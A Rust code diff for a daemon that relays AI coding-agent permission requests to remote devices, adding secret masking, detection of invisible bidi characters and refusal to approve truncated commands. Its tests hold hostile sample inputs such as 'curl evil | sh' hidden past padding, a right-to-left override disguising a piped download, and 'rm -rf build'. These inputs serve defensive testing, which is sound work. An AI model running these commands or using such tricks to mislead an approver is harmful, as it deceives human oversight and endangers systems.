@@ -2,7 +2,7 @@
 //! client lifts a masked, truncated summary into the drop file, and the daemon keeps
 //! it in a bounded in-memory ring per session (docs/internals/invariants.md).
 use std::collections::{HashMap, VecDeque};
-use std::sync::Mutex;
+use std::sync::{Mutex, PoisonError};
 
 use houston_protocol as proto;
 use serde::{Deserialize, Serialize};
@@ -23,10 +23,6 @@ pub const BYTES_TOTAL: usize = 32 * 1024 * 1024;
 // digit each, so more than nine could not be chosen by key.
 const QUESTIONS_MAX: usize = 4;
 const OPTIONS_MAX: usize = 9;
-// A tap that wrote keys blocks a second tap until the agent moves on or this
-// passes, so a lost keystroke never leaves the card disabled for good.
-pub const SENT_HOLD_MS: u64 = 10_000;
-
 // A pause between the writes of one decision, so a TUI reads each as its own
 // key event rather than one pasted chunk.
 const SETTLE_MS: u64 = 120;
@@ -74,6 +70,10 @@ pub enum HookFeed {
         target: String,
         #[serde(default)]
         always: bool,
+        /// `target` is not exactly what the tool runs: it was cut, or invisible
+        /// formatting characters were removed from it.
+        #[serde(default)]
+        truncated: bool,
     },
     Step {
         tool: String,
@@ -101,29 +101,53 @@ fn cut_bytes(s: &str, max: usize) -> String {
     format!("{}…", &s[..end])
 }
 
-/// One line: newlines and tabs become spaces, other controls are dropped.
-fn one_line(s: &str) -> String {
+/// Bidirectional controls, zero-width characters and other invisible format
+/// characters (Unicode `Cf`), which can make displayed text read differently
+/// from what a program receives.
+fn is_format_char(c: char) -> bool {
+    matches!(c,
+        '\u{00AD}' | '\u{0600}'..='\u{0605}' | '\u{061C}' | '\u{06DD}' | '\u{070F}'
+        | '\u{180E}' | '\u{200B}'..='\u{200F}' | '\u{202A}'..='\u{202E}'
+        | '\u{2060}'..='\u{2064}' | '\u{2066}'..='\u{206F}' | '\u{FEFF}'
+        | '\u{FFF9}'..='\u{FFFB}' | '\u{E0001}' | '\u{E0020}'..='\u{E007F}')
+}
+
+/// Text as a device shows it: newlines and tabs are kept, or folded into
+/// spaces, and controls and invisible format characters are dropped. The
+/// flag reports that format characters were found.
+fn plain(s: &str, keep_newlines: bool) -> (String, bool) {
     let mut out = String::with_capacity(s.len());
-    for c in s.chars() {
+    let mut hidden = false;
+    for c in s.replace("\r\n", "\n").chars() {
         match c {
+            '\n' | '\t' if keep_newlines => out.push(c),
             '\n' | '\r' | '\t' => {
                 if !out.ends_with(' ') {
                     out.push(' ');
                 }
             }
             c if c.is_control() => {}
+            c if is_format_char(c) => hidden = true,
             c => out.push(c),
         }
     }
-    out.trim().to_string()
+    (out.trim().to_string(), hidden)
+}
+
+fn one_line(s: &str) -> String {
+    plain(s, false).0
+}
+
+/// The one masker for every feed text: the credential patterns used for
+/// review packets (headers, `KEY=value`, URL passwords, named tokens), then the
+/// high-entropy pass.
+pub fn mask(s: &str) -> String {
+    let (text, _) = crate::sanitize::redact_review_secrets(s);
+    crate::sanitize::redact_high_entropy(&text).0
 }
 
 fn mask_text(s: &str) -> String {
-    crate::sanitize::redact_secrets(s).0
-}
-
-fn mask_target(s: &str) -> String {
-    crate::sanitize::redact_command_secrets(s).0
+    mask(&plain(s, true).0)
 }
 
 fn str_at<'a>(v: &'a serde_json::Value, key: &str) -> Option<&'a str> {
@@ -131,10 +155,15 @@ fn str_at<'a>(v: &'a serde_json::Value, key: &str) -> Option<&'a str> {
 }
 
 /// The one value that says what a tool acts on: a command, a path, a URL or a
-/// pattern. Anything else in the tool input stays out of the feed.
-fn tool_target(input: Option<&serde_json::Value>, max: usize) -> String {
+/// pattern. Anything else in the tool input stays out of the feed. The flag
+/// reports that the result is not exactly the tool's input (see `HookFeed::Permission`).
+fn tool_target(
+    input: Option<&serde_json::Value>,
+    max: usize,
+    keep_newlines: bool,
+) -> (String, bool) {
     let Some(input) = input else {
-        return String::new();
+        return (String::new(), false);
     };
     let command = match input.get("command").or_else(|| input.get("cmd")) {
         Some(serde_json::Value::String(s)) => Some(s.clone()),
@@ -160,8 +189,12 @@ fn tool_target(input: Option<&serde_json::Value>, max: usize) -> String {
         .iter()
         .find_map(|k| str_at(input, k).map(str::to_string))
     });
-    raw.map(|r| cut_chars(&one_line(&mask_target(&r)), max))
-        .unwrap_or_default()
+    let Some(raw) = raw else {
+        return (String::new(), false);
+    };
+    let (text, hidden) = plain(&mask(&raw), keep_newlines);
+    let cut = text.chars().count() > max;
+    (cut_chars(&text, max), cut || hidden)
 }
 
 fn tool_name(v: &serde_json::Value) -> Option<String> {
@@ -279,16 +312,20 @@ pub fn from_hook(
                 answers,
             })
         }
-        "PermissionRequest" => Some(HookFeed::Permission {
-            tool: name.unwrap_or_else(|| "tool".to_string()),
-            target: tool_target(tool_input(&v), SUMMARY_MAX_CHARS),
-            always: v
-                .get("permission_suggestions")
-                .and_then(|s| s.as_array())
-                .is_some_and(|s| !s.is_empty()),
-        }),
+        "PermissionRequest" => {
+            let (target, truncated) = tool_target(tool_input(&v), SUMMARY_MAX_CHARS, true);
+            Some(HookFeed::Permission {
+                tool: name.unwrap_or_else(|| "tool".to_string()),
+                target,
+                always: v
+                    .get("permission_suggestions")
+                    .and_then(|s| s.as_array())
+                    .is_some_and(|s| !s.is_empty()),
+                truncated,
+            })
+        }
         "PostToolUse" => Some(HookFeed::Step {
-            target: tool_target(tool_input(&v), STEP_MAX_CHARS),
+            target: tool_target(tool_input(&v), STEP_MAX_CHARS, false).0,
             tool: name?,
         }),
         _ => None,
@@ -296,13 +333,13 @@ pub fn from_hook(
 }
 
 /// A turn's final message for the feed: the orchestration cap's trailing note
-/// is dropped, and the text is held to `REPLY_MAX_BYTES`.
+/// is dropped, the text is masked, and it is held to `REPLY_MAX_BYTES`.
 pub fn reply_text(message: &str) -> String {
     let body = match message.find("\n…[submit truncated:") {
         Some(at) => format!("{}…", &message[..at]),
         None => message.to_string(),
     };
-    cut_bytes(body.trim(), REPLY_MAX_BYTES)
+    cut_bytes(mask_text(&body).trim(), REPLY_MAX_BYTES)
 }
 
 /// A device's view of one feed entry.
@@ -316,6 +353,9 @@ pub enum FeedItem {
         text: String,
     },
     Question {
+        /// The hook's id, to match its answer; never sent to a device.
+        #[serde(skip)]
+        tool_use_id: Option<String>,
         questions: Vec<Question>,
         answers: Option<Vec<String>>,
     },
@@ -327,6 +367,7 @@ pub enum FeedItem {
         tool: String,
         target: String,
         always: bool,
+        truncated: bool,
         /// `resolved` once the agent moved on; which choice was made is not reported.
         outcome: Option<&'static str>,
     },
@@ -343,7 +384,9 @@ impl FeedItem {
     fn weight(&self) -> usize {
         64 + match self {
             FeedItem::Prompt { text } | FeedItem::Reply { text } => text.len(),
-            FeedItem::Question { questions, answers } => {
+            FeedItem::Question {
+                questions, answers, ..
+            } => {
                 questions
                     .iter()
                     .map(|q| {
@@ -390,6 +433,15 @@ pub enum Card {
     Input,
 }
 
+/// How a card was answered while it is still the pending one.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Answered {
+    /// A device's decision wrote its keys.
+    Sent,
+    /// Someone typed into the pane, on the desktop or a device, after the card arrived.
+    Elsewhere,
+}
+
 #[derive(Debug, Clone)]
 pub struct Pending {
     /// The feed entry the card was built from; 0 for `Input`, which has none.
@@ -398,28 +450,38 @@ pub struct Pending {
     pub title: String,
     /// What a permission acts on, as the feed entry shows it; empty otherwise.
     pub detail: String,
+    /// `detail` is not exactly what the tool runs (see `HookFeed::Permission`).
+    pub truncated: bool,
     pub provider: proto::AgentKind,
     pub since_ms: u64,
-    pub sent_at_ms: Option<u64>,
+    /// Set once answered; the card stays consumed until the pane's status
+    /// changes or a new card replaces it, because the agent reports no hook
+    /// between a granted permission and the end of the tool it runs.
+    pub answered: Option<Answered>,
 }
 
 /// The summary `/api/sessions` and the feed carry for the active card.
 #[derive(Debug, Clone, Serialize)]
 pub struct PendingView {
+    /// The feed generation the card belongs to; a decision must name it.
+    pub epoch: String,
     pub seq: u64,
     #[serde(rename = "type")]
     pub kind: &'static str,
     pub title: String,
     pub detail: String,
+    pub truncated: bool,
     pub since: u64,
     /// Houston knows the keys this provider's prompt takes for this card.
     pub decidable: bool,
     pub sent: bool,
+    pub answered_elsewhere: bool,
 }
 
 impl Pending {
-    pub fn view(&self, now_ms: u64) -> PendingView {
+    fn view(&self, epoch: &str) -> PendingView {
         PendingView {
+            epoch: epoch.to_string(),
             seq: self.seq,
             kind: match self.card {
                 Card::Permission { .. } => "permission",
@@ -428,15 +490,12 @@ impl Pending {
             },
             title: self.title.clone(),
             detail: self.detail.clone(),
+            truncated: self.truncated,
             since: self.since_ms,
             decidable: decision_support(self.provider, &self.card).is_ok(),
-            sent: self.is_sent(now_ms),
+            sent: self.answered == Some(Answered::Sent),
+            answered_elsewhere: self.answered == Some(Answered::Elsewhere),
         }
-    }
-
-    fn is_sent(&self, now_ms: u64) -> bool {
-        self.sent_at_ms
-            .is_some_and(|at| now_ms.saturating_sub(at) < SENT_HOLD_MS)
     }
 }
 
@@ -471,6 +530,7 @@ pub enum Change {
 }
 
 pub struct FeedPage {
+    pub epoch: String,
     pub entries: Vec<FeedEntry>,
     pub first_seq: u64,
     pub last_seq: u64,
@@ -485,24 +545,84 @@ pub struct SessionSummary {
     pub last_step: Option<String>,
 }
 
-#[derive(Default)]
+/// Why a decision was refused.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum Refusal {
+    /// The device's view is from an earlier feed generation.
+    Epoch,
+    /// `seq` is not the pending structured card; carries the one that is.
+    NotPending(Option<u64>),
+    Answered(Answered),
+    /// The provider or the card's shape has no key mapping.
+    Unsupported(String),
+    /// Approving a target the device could not see in full.
+    Partial,
+    /// The choice does not answer this card.
+    Choice(String),
+}
+
+/// A pane's feed while remote access is on. Turning it off clears every ring
+/// and card and starts a new epoch, and nothing is collected until it is on again.
 pub struct Store {
     inner: Mutex<StoreInner>,
 }
 
-#[derive(Default)]
+impl Default for Store {
+    fn default() -> Self {
+        Store {
+            inner: Mutex::new(StoreInner {
+                sessions: HashMap::new(),
+                bytes: 0,
+                collecting: false,
+                epoch: new_epoch(),
+            }),
+        }
+    }
+}
+
 struct StoreInner {
     sessions: HashMap<u32, SessionFeed>,
     bytes: usize,
+    collecting: bool,
+    epoch: String,
+}
+
+fn new_epoch() -> String {
+    let mut bytes = [0u8; 8];
+    rand::fill(&mut bytes);
+    format!("{:016x}", u64::from_le_bytes(bytes))
 }
 
 impl Store {
+    /// A panic while the lock is held must not reach the status path, which
+    /// also takes it: the data is a display cache, so a poisoned lock is used as is.
     fn with<T>(&self, f: impl FnOnce(&mut StoreInner) -> T) -> T {
-        f(&mut self.inner.lock().expect("remote feed lock"))
+        f(&mut self.inner.lock().unwrap_or_else(PoisonError::into_inner))
     }
 
-    pub fn push(&self, session: u32, item: FeedItem, now_ms: u64) -> u64 {
+    /// On starts a new epoch; off forgets every ring and card.
+    pub fn set_collecting(&self, on: bool) {
         self.with(|inner| {
+            if on == inner.collecting {
+                return;
+            }
+            inner.collecting = on;
+            inner.sessions.clear();
+            inner.bytes = 0;
+            inner.epoch = new_epoch();
+        })
+    }
+
+    pub fn epoch(&self) -> String {
+        self.with(|inner| inner.epoch.clone())
+    }
+
+    /// The new entry's sequence number, or `None` while not collecting.
+    pub fn push(&self, session: u32, item: FeedItem, now_ms: u64) -> Option<u64> {
+        self.with(|inner| {
+            if !inner.collecting {
+                return None;
+            }
             let weight = item.weight();
             let feed = inner.sessions.entry(session).or_default();
             match &item {
@@ -550,13 +670,16 @@ impl Store {
                 let w = largest.evict_oldest();
                 inner.bytes -= w;
             }
-            seq
+            Some(seq)
         })
     }
 
     /// Replaces any card; an `Input` card never replaces a structured one.
     pub fn set_pending(&self, session: u32, pending: Pending) -> bool {
         self.with(|inner| {
+            if !inner.collecting {
+                return false;
+            }
             let feed = inner.sessions.entry(session).or_default();
             if matches!(pending.card, Card::Input) && feed.pending.is_some() {
                 return false;
@@ -585,7 +708,10 @@ impl Store {
         })
     }
 
-    /// Records a question's answers and clears its card when it is the pending one.
+    /// Records a question's answers and clears its card when it is the pending
+    /// one. The card is often gone by then (the answer's status transition
+    /// retires it first), so the latest unanswered question takes the answers:
+    /// the one with the hook's `tool_use_id`, or any when the hook carries none.
     pub fn answer_question(
         &self,
         session: u32,
@@ -617,7 +743,14 @@ impl Store {
                 feed.entries
                     .iter()
                     .rev()
-                    .find(|e| matches!(e.item, FeedItem::Question { answers: None, .. }))
+                    .find(|e| match &e.item {
+                        FeedItem::Question {
+                            tool_use_id: id,
+                            answers: None,
+                            ..
+                        } => matches(id),
+                        _ => false,
+                    })
                     .map(|e| e.seq)
             });
             if let Some(entry) =
@@ -635,36 +768,86 @@ impl Store {
         self.with(|inner| inner.sessions.get(&session).and_then(|f| f.pending.clone()))
     }
 
-    pub fn mark_sent(&self, session: u32, seq: u64, now_ms: u64) {
+    /// Checks and consumes the card in one step, so two devices tapping at
+    /// once cannot both type: the first marks it sent, the second is refused.
+    pub fn begin_decision(
+        &self,
+        session: u32,
+        epoch: &str,
+        seq: u64,
+        choice: &Choice,
+        waiting: bool,
+    ) -> Result<KeyPlan, Refusal> {
         self.with(|inner| {
-            if let Some(p) = inner
+            if inner.epoch != epoch {
+                return Err(Refusal::Epoch);
+            }
+            if !waiting {
+                return Err(Refusal::NotPending(None));
+            }
+            let slot = inner
                 .sessions
                 .get_mut(&session)
-                .and_then(|f| f.pending.as_mut())
-                .filter(|p| p.seq == seq)
-            {
-                p.sent_at_ms = Some(now_ms);
+                .and_then(|f| f.pending.as_mut());
+            let p = match slot {
+                Some(p) if p.seq == seq && p.seq != 0 => p,
+                other => {
+                    return Err(Refusal::NotPending(
+                        other.map(|p| p.seq).filter(|seq| *seq != 0),
+                    ))
+                }
+            };
+            if let Some(answered) = p.answered {
+                return Err(Refusal::Answered(answered));
             }
+            decision_support(p.provider, &p.card).map_err(Refusal::Unsupported)?;
+            if p.truncated && matches!(choice, Choice::Approve | Choice::Always) {
+                return Err(Refusal::Partial);
+            }
+            let plan = decision_keys(p.provider, &p.card, choice).map_err(Refusal::Choice)?;
+            p.answered = Some(Answered::Sent);
+            Ok(plan)
         })
     }
 
+    /// Undoes `begin_decision` when its keys could not be written.
     pub fn clear_sent(&self, session: u32, seq: u64) {
         self.with(|inner| {
             if let Some(p) = inner
                 .sessions
                 .get_mut(&session)
                 .and_then(|f| f.pending.as_mut())
-                .filter(|p| p.seq == seq)
+                .filter(|p| p.seq == seq && p.answered == Some(Answered::Sent))
             {
-                p.sent_at_ms = None;
+                p.answered = None;
             }
         })
     }
 
-    pub fn page(&self, session: u32, after: u64, now_ms: u64) -> FeedPage {
+    /// A keystroke reached the pane: an open structured card was answered
+    /// there. Returns whether the card changed.
+    pub fn note_keystroke(&self, session: u32) -> bool {
         self.with(|inner| {
+            match inner
+                .sessions
+                .get_mut(&session)
+                .and_then(|f| f.pending.as_mut())
+            {
+                Some(p) if p.seq != 0 && p.answered.is_none() => {
+                    p.answered = Some(Answered::Elsewhere);
+                    true
+                }
+                _ => false,
+            }
+        })
+    }
+
+    pub fn page(&self, session: u32, after: u64) -> FeedPage {
+        self.with(|inner| {
+            let epoch = inner.epoch.clone();
             let Some(feed) = inner.sessions.get(&session) else {
                 return FeedPage {
+                    epoch,
                     entries: Vec::new(),
                     first_seq: 0,
                     last_seq: 0,
@@ -682,16 +865,17 @@ impl Store {
                     .collect(),
                 first_seq,
                 last_seq: feed.next_seq,
-                truncated: after + 1 < first_seq && after < feed.next_seq,
-                pending: feed.pending.as_ref().map(|p| p.view(now_ms)),
+                truncated: after.saturating_add(1) < first_seq && after < feed.next_seq,
+                pending: feed.pending.as_ref().map(|p| p.view(&epoch)),
+                epoch,
             }
         })
     }
 
-    pub fn summary(&self, session: u32, now_ms: u64) -> SessionSummary {
+    pub fn summary(&self, session: u32) -> SessionSummary {
         self.with(|inner| match inner.sessions.get(&session) {
             Some(f) => SessionSummary {
-                pending: f.pending.as_ref().map(|p| p.view(now_ms)),
+                pending: f.pending.as_ref().map(|p| p.view(&inner.epoch)),
                 last_reply_excerpt: f.last_reply_excerpt.clone(),
                 last_step: f.last_step.clone(),
             },
@@ -908,6 +1092,7 @@ mod tests {
             tool,
             target,
             always,
+            ..
         }) = from_hook(CLAUDE, "PermissionRequest", &payload, None)
         else {
             panic!("a permission entry");
@@ -1019,13 +1204,32 @@ mod tests {
         assert!(err.contains("codex"), "{err}");
     }
 
+    fn collecting() -> Store {
+        let store = Store::default();
+        store.set_collecting(true);
+        store
+    }
+
+    fn permission(seq: u64, truncated: bool) -> Pending {
+        Pending {
+            seq,
+            card: Card::Permission { always: false },
+            title: "Bash".into(),
+            detail: "npm test".into(),
+            truncated,
+            provider: CLAUDE,
+            since_ms: 0,
+            answered: None,
+        }
+    }
+
     #[test]
     fn the_ring_is_bounded_by_count_and_bytes() {
-        let store = Store::default();
+        let store = collecting();
         for i in 0..(ENTRIES_PER_SESSION + 5) {
             store.push(1, FeedItem::Status { status: "finished" }, i as u64);
         }
-        let page = store.page(1, 0, 0);
+        let page = store.page(1, 0);
         assert_eq!(page.entries.len(), ENTRIES_PER_SESSION);
         assert!(page.truncated);
         assert_eq!(page.last_seq, (ENTRIES_PER_SESSION + 5) as u64);
@@ -1033,7 +1237,7 @@ mod tests {
         for _ in 0..100 {
             store.push(2, FeedItem::Reply { text: big.clone() }, 0);
         }
-        assert!(store.page(2, 0, 0).entries.len() < 100);
+        assert!(store.page(2, 0).entries.len() < 100);
         assert!(store.bytes_for_test() <= 2 * BYTES_PER_SESSION);
         store.prune(0, |id| id == 1);
         assert!(store.bytes_for_test() < BYTES_PER_SESSION);
@@ -1041,20 +1245,220 @@ mod tests {
 
     #[test]
     fn an_input_card_never_replaces_a_structured_one() {
-        let store = Store::default();
-        let pending = |card| Pending {
-            seq: 3,
-            card,
-            title: String::new(),
-            detail: String::new(),
-            provider: CLAUDE,
-            since_ms: 0,
-            sent_at_ms: None,
+        let store = collecting();
+        assert!(store.set_pending(1, permission(3, false)));
+        let input = Pending {
+            card: Card::Input,
+            ..permission(3, false)
         };
-        assert!(store.set_pending(1, pending(Card::Permission { always: false })));
-        assert!(!store.set_pending(1, pending(Card::Input)));
+        assert!(!store.set_pending(1, input));
         assert_eq!(store.pending(1).unwrap().seq, 3);
         assert!(store.resolve_pending(1));
         assert!(store.pending(1).is_none());
+    }
+
+    #[test]
+    fn a_decided_card_stays_consumed_until_it_is_replaced() {
+        let store = collecting();
+        let epoch = store.epoch();
+        store.set_pending(1, permission(4, false));
+        assert!(store
+            .begin_decision(1, &epoch, 4, &Choice::Approve, true)
+            .is_ok());
+        // However long the approved tool runs, the card takes no second tap.
+        assert_eq!(
+            store
+                .begin_decision(1, &epoch, 4, &Choice::Deny, true)
+                .unwrap_err(),
+            Refusal::Answered(Answered::Sent)
+        );
+        assert!(store.pending(1).unwrap().answered.is_some());
+        store.clear_sent(1, 4);
+        assert!(store
+            .begin_decision(1, &epoch, 4, &Choice::Deny, true)
+            .is_ok());
+        store.set_pending(1, permission(5, false));
+        assert!(store
+            .begin_decision(1, &epoch, 5, &Choice::Deny, true)
+            .is_ok());
+    }
+
+    #[test]
+    fn a_keystroke_retires_an_open_card_but_not_an_input_one() {
+        let store = collecting();
+        store.set_pending(1, permission(4, false));
+        assert!(store.note_keystroke(1));
+        assert!(!store.note_keystroke(1), "already answered");
+        let err = store
+            .begin_decision(1, &store.epoch(), 4, &Choice::Approve, true)
+            .unwrap_err();
+        assert_eq!(err, Refusal::Answered(Answered::Elsewhere));
+        store.resolve_pending(1);
+        store.set_pending(
+            1,
+            Pending {
+                seq: 0,
+                card: Card::Input,
+                ..permission(0, false)
+            },
+        );
+        assert!(!store.note_keystroke(1));
+    }
+
+    #[test]
+    fn decisions_name_the_epoch_and_approval_needs_the_whole_target() {
+        let store = collecting();
+        store.set_pending(1, permission(2, true));
+        assert_eq!(
+            store
+                .begin_decision(1, "0000000000000000", 2, &Choice::Deny, true)
+                .unwrap_err(),
+            Refusal::Epoch
+        );
+        let epoch = store.epoch();
+        assert_eq!(
+            store
+                .begin_decision(1, &epoch, 2, &Choice::Approve, true)
+                .unwrap_err(),
+            Refusal::Partial
+        );
+        assert!(store
+            .begin_decision(1, &epoch, 2, &Choice::Deny, true)
+            .is_ok());
+    }
+
+    #[test]
+    fn turning_collection_off_forgets_rings_and_cards_and_keeps_out_new_ones() {
+        let store = collecting();
+        let before = store.epoch();
+        store.push(1, FeedItem::Prompt { text: "hi".into() }, 0);
+        store.set_pending(1, permission(1, false));
+        store.set_collecting(false);
+        assert!(store.pending(1).is_none());
+        assert_eq!(store.page(1, 0).last_seq, 0);
+        assert_eq!(
+            store.push(1, FeedItem::Prompt { text: "x".into() }, 0),
+            None
+        );
+        assert!(!store.set_pending(1, permission(1, false)));
+        store.set_collecting(true);
+        assert_ne!(store.epoch(), before);
+        assert_eq!(store.bytes_for_test(), 0);
+    }
+
+    #[test]
+    fn a_page_after_the_largest_sequence_is_empty_not_a_panic() {
+        let store = collecting();
+        store.push(1, FeedItem::Prompt { text: "hi".into() }, 0);
+        let page = store.page(1, u64::MAX);
+        assert!(page.entries.is_empty() && !page.truncated);
+    }
+
+    #[test]
+    fn a_panic_under_the_lock_does_not_disable_the_store() {
+        let store = std::sync::Arc::new(collecting());
+        let s = std::sync::Arc::clone(&store);
+        let _ = std::thread::spawn(move || s.with(|_| panic!("a reader panicked"))).join();
+        assert_eq!(
+            store.push(1, FeedItem::Prompt { text: "hi".into() }, 0),
+            Some(1)
+        );
+    }
+
+    #[test]
+    fn an_answer_with_an_unknown_id_does_not_fill_another_question() {
+        let store = collecting();
+        let seq = store
+            .push(
+                1,
+                FeedItem::Question {
+                    tool_use_id: Some("t1".into()),
+                    questions: vec![question(2, false, false)],
+                    answers: None,
+                },
+                0,
+            )
+            .unwrap();
+        store.set_pending(
+            1,
+            Pending {
+                seq,
+                card: Card::Question {
+                    tool_use_id: Some("t1".into()),
+                    questions: vec![question(2, false, false)],
+                },
+                ..permission(seq, false)
+            },
+        );
+        assert!(!store.answer_question(1, Some("t2"), vec!["o1".into()]));
+        assert!(store.pending(1).is_some());
+        // Its status transition retired the card before the answer arrived.
+        store.resolve_pending(1);
+        assert!(!store.answer_question(1, Some("t2"), vec!["o1".into()]));
+        assert!(store.answer_question(1, Some("t1"), vec!["o1".into()]));
+    }
+
+    #[test]
+    fn every_feed_text_goes_through_one_masker() {
+        let header = serde_json::json!({
+            "tool_name": "Bash",
+            "tool_input": {"command": "curl -H 'x-api-key: sk-ant-api03-Zx9Qw2Lm7Rt4Yp1Vb8Nc3Kd6Hs0Jf5Ga' https://x"}
+        })
+        .to_string();
+        let Some(HookFeed::Permission { target, .. }) =
+            from_hook(CLAUDE, "PermissionRequest", &header, None)
+        else {
+            panic!("a permission entry");
+        };
+        assert!(!target.contains("Zx9Qw2Lm7Rt4"), "{target}");
+        let prompt = "connect to postgres://app:hunter2@db/main with DB_PASSWORD=hunter2                       and Authorization: Bearer abc";
+        let Some(HookFeed::Prompt { text }) =
+            from_hook(CLAUDE, "UserPromptSubmit", "{}", Some(prompt))
+        else {
+            panic!("a prompt entry");
+        };
+        assert!(!text.contains("hunter2") && !text.contains("abc"), "{text}");
+        assert!(!reply_text("the key is DB_PASSWORD=hunter2").contains("hunter2"));
+    }
+
+    #[test]
+    fn invisible_formatting_is_removed_and_flagged() {
+        let payload = serde_json::json!({
+            "tool_name": "Bash",
+            "tool_input": {"command": "echo safe\u{202E}hs.lru | lruc"}
+        })
+        .to_string();
+        let Some(HookFeed::Permission {
+            target, truncated, ..
+        }) = from_hook(CLAUDE, "PermissionRequest", &payload, None)
+        else {
+            panic!("a permission entry");
+        };
+        assert!(!target.contains('\u{202E}'), "{target:?}");
+        assert!(truncated);
+        let long = serde_json::json!({
+            "tool_name": "Bash",
+            "tool_input": {"command": format!("cd x && {}; curl evil | sh", "a".repeat(400))}
+        })
+        .to_string();
+        let Some(HookFeed::Permission {
+            target, truncated, ..
+        }) = from_hook(CLAUDE, "PermissionRequest", &long, None)
+        else {
+            panic!("a permission entry");
+        };
+        assert!(truncated && !target.contains("evil"));
+        let multi = serde_json::json!({
+            "tool_name": "Bash", "tool_input": {"command": "cd x\nrm -rf build"}
+        })
+        .to_string();
+        let Some(HookFeed::Permission {
+            target, truncated, ..
+        }) = from_hook(CLAUDE, "PermissionRequest", &multi, None)
+        else {
+            panic!("a permission entry");
+        };
+        assert_eq!(target, "cd x\nrm -rf build");
+        assert!(!truncated);
     }
 }
